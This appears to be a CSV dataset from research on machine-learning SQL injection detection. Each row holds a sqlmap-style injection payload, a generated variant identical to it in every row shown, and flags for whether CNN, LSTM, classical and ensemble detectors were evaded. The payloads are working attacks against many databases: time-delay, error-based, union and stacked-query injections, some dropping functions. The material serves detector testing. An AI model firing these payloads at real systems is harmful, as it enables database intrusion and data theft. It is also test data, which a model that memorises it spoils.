,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
1608,1'||(select 'lnhq' where 7526=7526;if(7899=7899) select 7899 else drop function zbbp--,1'||(select 'lnhq' where 7526=7526;if(7899=7899) select 7899 else drop function zbbp--,1,1,0,0,0,0,0
1609,"1'||(select 'wgte' from dual where 6316=6316 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'","1'||(select 'wgte' from dual where 6316=6316 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",1,1,0,0,1,0,0
1610,"1"") where 3943=3943 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","1"") where 3943=3943 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1,1,0,0,0,0,0
1611,"1"")) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((""aall"" like ""aall","1"")) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((""aall"" like ""aall",1,1,0,0,0,0,0
1612,"1%"" rlike (select (case when (5135=9839) then 1 else 0x28 end)) and ""%""=""","1%"" rlike (select (case when (5135=9839) then 1 else 0x28 end)) and ""%""=""",1,1,0,0,0,0,0
1613,1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),1,1,0,0,0,0,0
1614,"1%""))) and elt(9524=1124,1124) and (((""%""=""","1%""))) and elt(9524=1124,1124) and (((""%""=""",1,1,0,0,0,0,0
1615,1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('yhku' like 'yhku,1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('yhku' like 'yhku,1,1,0,0,0,0,0
1616,"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('gmbd'='gmbd","1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('gmbd'='gmbd",1,1,0,0,0,0,0
1617,"1%"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""%""=""","1%"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""%""=""",1,1,0,0,0,0,0
1618,"1 where 8135=8135;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","1 where 8135=8135;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,1,0,0,0,0,0
1619,1' or sleep(5) and 'udqz'='udqz,1' or sleep(5) and 'udqz'='udqz,1,1,0,0,0,0,0
1620,"1') where 5317=5317 and 8407=(select count(*) from generate_series(1,5000000))--","1') where 5317=5317 and 8407=(select count(*) from generate_series(1,5000000))--",1,1,0,0,0,0,0
1621,"-6170))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","-6170))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,1,0,0,0,0,0
1622,"1"")) or elt(5873=5873,sleep(5))#","1"")) or elt(5873=5873,sleep(5))#",1,1,0,0,0,0,0
1623,"1))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
1624,1) as tykp where 6851=6851;waitfor delay '0:0:5'--,1) as tykp where 6851=6851;waitfor delay '0:0:5'--,1,1,0,0,0,0,0
1625,1'))) or (select * from (select(sleep(5)))sddo)#,1'))) or (select * from (select(sleep(5)))sddo)#,1,1,0,0,1,0,0
1626,1);select (case when (3626=6022) then 3626 else cast(1 as int)/(select 0 from dual) end) from dual--,1);select (case when (3626=6022) then 3626 else cast(1 as int)/(select 0 from dual) end) from dual--,1,1,0,0,1,0,0
1627,"-6851') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('csfx'='csfx","-6851') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('csfx'='csfx",1,1,0,0,0,0,0
1628,1'+(select 'stsu' where 2386=2386 or sleep(5)#,1'+(select 'stsu' where 2386=2386 or sleep(5)#,1,1,0,0,0,0,0
1629,"1'+(select tnch where 1867=1867 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'","1'+(select tnch where 1867=1867 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",1,1,0,0,0,0,0
1630,1) as gfhf where 5804=5804 or 6793=(select 6793 from pg_sleep(5))--,1) as gfhf where 5804=5804 or 6793=(select 6793 from pg_sleep(5))--,1,1,0,0,0,0,0
1631,"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('vjkf' like 'vjkf","1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('vjkf' like 'vjkf",1,1,0,0,1,0,0
1632,1%';if(6842=5446) select 6842 else drop function vjfq--,1%';if(6842=5446) select 6842 else drop function vjfq--,1,1,0,0,0,0,0
1633,"1"")));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","1"")));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,1,0,0,0,0,0
1634,"1'||(select 'hrpa' where 1973=1973 union all select null,null,null,null,null,null,null,null,null--","1'||(select 'hrpa' where 1973=1973 union all select null,null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
1635,"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)","1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1,1,0,0,0,0,0
1636,"-5132%"")) or 3038=3038","-5132%"")) or 3038=3038",1,1,0,0,0,0,0
1637,"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,1,0,0,0,0,0
1638,"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('yabn'='yabn","1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('yabn'='yabn",1,1,0,0,0,0,0
1639,"1%')) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","1%')) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1,1,0,0,0,0,0
1640,"-1157)) as sxie where 7118=7118 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","-1157)) as sxie where 7118=7118 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1,1,0,0,0,0,0
1641,"-2612"") as iwfj where 3231=3231 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--","-2612"") as iwfj where 3231=3231 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",1,1,0,0,0,0,0
1642,"-3361'||(select 'msfi' where 4806=4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--","-3361'||(select 'msfi' where 4806=4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1,1,0,0,0,0,0
1643,"1%"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""%""=""","1%"")) and 3824=benchmark(5000000,md5(0x76555642)) and ((""%""=""",1,1,0,0,0,0,0
1644,1);(select * from (select(sleep(5)))srmq),1);(select * from (select(sleep(5)))srmq),1,1,0,0,1,0,0
1645,"1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""bizm""=""bizm","1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""bizm""=""bizm",1,1,0,0,0,0,0
1646,"1') where 1115=1115;call regexp_substring(repeat(right(char(2385),0),500000000),null)--","1') where 1115=1115;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1,1,0,0,1,0,0
1647,"1%')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('%'='","1%')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('%'='",1,1,0,0,0,0,0
1648,"1'+(select 'kqnj' where 9483=9483 or elt(5873=5873,sleep(5))#","1'+(select 'kqnj' where 9483=9483 or elt(5873=5873,sleep(5))#",1,1,0,0,0,0,0
1649,"1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('nlfl' like 'nlfl","1') and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('nlfl' like 'nlfl",1,1,0,0,0,0,0
1650,-6661')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('tbmu' like 'tbmu,-6661')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('tbmu' like 'tbmu,1,1,0,0,0,0,0
1651,-7675%'))) order by 1--,-7675%'))) order by 1--,1,1,0,0,0,0,0
1652,"1%""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""","1%""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",1,1,0,0,0,0,0
1653,"1) as mpnj where 5049=5049;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","1) as mpnj where 5049=5049;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,1,0,0
1654,"1) where 6424=6424;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","1) where 6424=6424;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1,1,0,0,1,0,0
1655,1')));select (case when (4111=1992) then 4111 else 1/(select 0) end)--,1')));select (case when (4111=1992) then 4111 else 1/(select 0) end)--,1,1,0,0,0,0,0
1656,"-1644%' or make_set(9354=9354,7185) and '%'='","-1644%' or make_set(9354=9354,7185) and '%'='",1,1,0,0,0,0,0
1657,"-1631%"") or elt(8285=1709,1709) and (""%""=""","-1631%"") or elt(8285=1709,1709) and (""%""=""",1,1,0,0,0,0,0
1658,1);if(7899=7899) select 7899 else drop function zbbp--,1);if(7899=7899) select 7899 else drop function zbbp--,1,1,0,0,0,0,0
1659,1' in boolean mode);select case when 7649=9297 then 1 else null end--,1' in boolean mode);select case when 7649=9297 then 1 else null end--,1,1,0,0,0,0,0
1660,"1') where 6388=6388 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","1') where 6388=6388 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,1,0,0,0,0,0
1661,"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))","1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",1,1,0,0,0,0,0
1662,"-2110' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","-2110' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,1,0,0,0,0,0
1663,"-4739')) union all select 6585,6585,6585,6585,6585--","-4739')) union all select 6585,6585,6585,6585,6585--",1,1,0,0,0,0,0
1664,"1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))# ogwe","1 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))# ogwe",1,1,0,0,0,0,0
1665,"1);select like('abcdefg',upper(hex(randomblob(500000000/2))))--","1);select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,1,0,0
1666,"1%') or 8466=benchmark(5000000,md5(0x694a4745)) and ('%'='","1%') or 8466=benchmark(5000000,md5(0x694a4745)) and ('%'='",1,1,0,0,0,0,0
1667,"1 or 8421=(select count(*) from generate_series(1,5000000))# jmki","1 or 8421=(select count(*) from generate_series(1,5000000))# jmki",1,1,0,0,0,0,0
1668,"-7248"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""qgms""=""qgms","-7248"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""qgms""=""qgms",1,1,0,0,0,0,0
1669,1')));select (case when (8234=2498) then 8234 else cast(1 as int)/(select 0 from dual) end) from dual--,1')));select (case when (8234=2498) then 8234 else cast(1 as int)/(select 0 from dual) end) from dual--,1,1,0,0,0,0,0
1670,"1"" or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","1"" or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1,1,0,0,0,0,0
1671,"1"" or 8514=benchmark(5000000,md5(0x544d5a4c))#","1"" or 8514=benchmark(5000000,md5(0x544d5a4c))#",1,1,0,0,0,0,0
1672,"1) union all select null,null,null#","1) union all select null,null,null#",1,1,0,0,0,0,0
1673,"-4210"") where 2679=2679 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--","-4210"") where 2679=2679 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",1,1,0,0,0,0,0
1674,1) and sleep(5),1) and sleep(5),0,1,0,0,0,0,0
1675,"1'+(select 'vfkl' where 1713=1713 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'","1'+(select 'vfkl' where 1713=1713 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",1,1,0,0,0,0,0
1676,"1')) as iipj where 6560=6560;select count(*) from generate_series(1,5000000)--","1')) as iipj where 6560=6560;select count(*) from generate_series(1,5000000)--",1,1,0,0,0,0,0
1677,1'+(select 'gtqr' where 5660=5660;select pg_sleep(5)--,1'+(select 'gtqr' where 5660=5660;select pg_sleep(5)--,1,1,0,0,0,0,0
1678,"1) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","1) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",1,1,0,0,0,0,0
1679,1';select pg_sleep(5),1';select pg_sleep(5),1,1,0,0,1,0,0
1680,"1' where 4150=4150 and elt(8012=6026,6026)--","1' where 4150=4150 and elt(8012=6026,6026)--",1,1,0,0,0,0,0
1681,"1',(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))","1',(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))",1,1,0,0,0,0,0
1682,"1"" and elt(1210=1210,sleep(5))","1"" and elt(1210=1210,sleep(5))",1,1,0,0,0,0,0
1683,"1"")) as hkrh where 3060=3060 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","1"")) as hkrh where 3060=3060 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1,1,0,0,0,0,0
1684,1%')));select sleep(5) and ((('%'=',1%')));select sleep(5) and ((('%'=',1,1,0,0,0,0,0
1685,1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('mmow'='mmow,1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('mmow'='mmow,1,1,0,0,1,0,0
1686,"1%')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='","1%')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='",1,1,0,0,0,0,0
1687,"1"")));waitfor delay '0:0:5' and (((""lpeo""=""lpeo","1"")));waitfor delay '0:0:5' and (((""lpeo""=""lpeo",1,1,0,0,0,0,0
1688,"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'kjfm'='kjfm","1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'kjfm'='kjfm",1,1,0,0,0,0,0
1689,"-4462%"") or 8571=8571--","-4462%"") or 8571=8571--",1,1,0,0,0,0,0
1690,"1"") and 8635=(select count(*) from generate_series(1,5000000))--","1"") and 8635=(select count(*) from generate_series(1,5000000))--",1,1,0,0,0,0,0
1691,"-5182"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","-5182"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,1,0,0,0,0,0
1692,-2411%'))) or 6872=6872 and ((('%'=',-2411%'))) or 6872=6872 and ((('%'=',1,1,0,0,0,0,0
1693,1' in boolean mode) and 3787=7750--,1' in boolean mode) and 3787=7750--,1,1,0,0,0,0,0
1694,"1%'))) union all select null,null,null,null--","1%'))) union all select null,null,null,null--",1,1,0,0,0,0,0
1695,-6792)) as zlho where 4758=4758 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,-6792)) as zlho where 4758=4758 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1,1,0,0,0,0,0
1696,"1') where 9381=9381 or elt(6272=6272,sleep(5))--","1') where 9381=9381 or elt(6272=6272,sleep(5))--",1,1,0,0,0,0,0
1697,"1) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (5132=5132","1) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (5132=5132",1,1,0,0,0,0,0
1698,"1'+(select 'cstd' where 9326=9326 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))+'","1'+(select 'cstd' where 9326=9326 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))+'",1,1,0,0,0,0,0
1699,"1""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#","1""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",1,1,0,0,0,0,0
1700,"-5832"") or 1650=9011--","-5832"") or 1650=9011--",1,1,0,0,0,0,0
1701,1')) rlike sleep(5) and (('iwct'='iwct,1')) rlike sleep(5) and (('iwct'='iwct,1,1,0,0,0,0,0
1702,"1""))) and 6969=(select 6969 from pg_sleep(5)) and (((""ipqw"" like ""ipqw","1""))) and 6969=(select 6969 from pg_sleep(5)) and (((""ipqw"" like ""ipqw",1,1,0,0,0,0,0
1703,"-8636""))) union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--","-8636""))) union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",1,1,0,0,0,0,0
1704,1'+(select 'hplm' where 4008=4008 and 8594=(select 8594 from pg_sleep(5))--,1'+(select 'hplm' where 4008=4008 and 8594=(select 8594 from pg_sleep(5))--,1,1,0,0,0,0,0
1705,"-2862'))) union all select 6649,6649--","-2862'))) union all select 6649,6649--",1,1,0,0,0,0,0
1706,1) where 2930=2930;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1) where 2930=2930;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1,1,0,0,0,0,0
1707,"1"" where 7344=7344 rlike (select * from (select(sleep(5)))sgvo)--","1"" where 7344=7344 rlike (select * from (select(sleep(5)))sgvo)--",1,1,0,0,0,0,0
1708,"-3933'))) union all select 6198,6198,6198,6198,6198#","-3933'))) union all select 6198,6198,6198,6198,6198#",1,1,0,0,0,0,0
1709,"1"") where 5129=5129 order by 1--","1"") where 5129=5129 order by 1--",1,1,0,0,0,0,0
1710,"1"")) as duny where 3756=3756 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","1"")) as duny where 3756=3756 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1,1,0,0,0,0,0
1711,1') as xskm where 3525=3525 and 2435=6513,1') as xskm where 3525=3525 and 2435=6513,1,1,0,0,0,0,0
1712,"-3411'))) union all select 3185,3185,3185,3185,3185,3185,3185,3185--","-3411'))) union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1,1,0,0,0,0,0
1713,"1) where 7775=7775 union all select null,null,null,null--","1) where 7775=7775 union all select null,null,null,null--",1,1,0,0,0,0,0
1714,1')) as dcen where 5852=5852 or (select * from (select(sleep(5)))ydpu)--,1')) as dcen where 5852=5852 or (select * from (select(sleep(5)))ydpu)--,1,1,0,0,0,0,0
1715,"1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('vwtq'='vwtq","1')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('vwtq'='vwtq",1,1,0,0,0,0,0
1716,"1%""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""","1%""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",1,1,0,0,0,0,0
1717,"1) and elt(1210=1210,sleep(5))","1) and elt(1210=1210,sleep(5))",0,1,0,0,0,0,0
1718,1';select sleep(5),1';select sleep(5),1,1,0,0,1,0,0
1719,"make_set(7729=7729,1)","make_set(7729=7729,1)",0,1,0,0,0,0,0
1720,"-1678"" where 3706=3706 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","-1678"" where 3706=3706 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1,1,0,0,0,0,0
1721,-9363%' or (8459=8459)*4906 and '%'=',-9363%' or (8459=8459)*4906 and '%'=',1,1,0,0,0,0,0
1722,"-9337) union all select 5648,5648,5648,5648,5648#","-9337) union all select 5648,5648,5648,5648,5648#",1,1,0,0,0,0,0
1723,1' in boolean mode);select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1' in boolean mode);select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1,1,0,0,0,0,0
1724,-6823'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('lwlk' like 'lwlk,-6823'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('lwlk' like 'lwlk,1,1,0,0,0,0,0
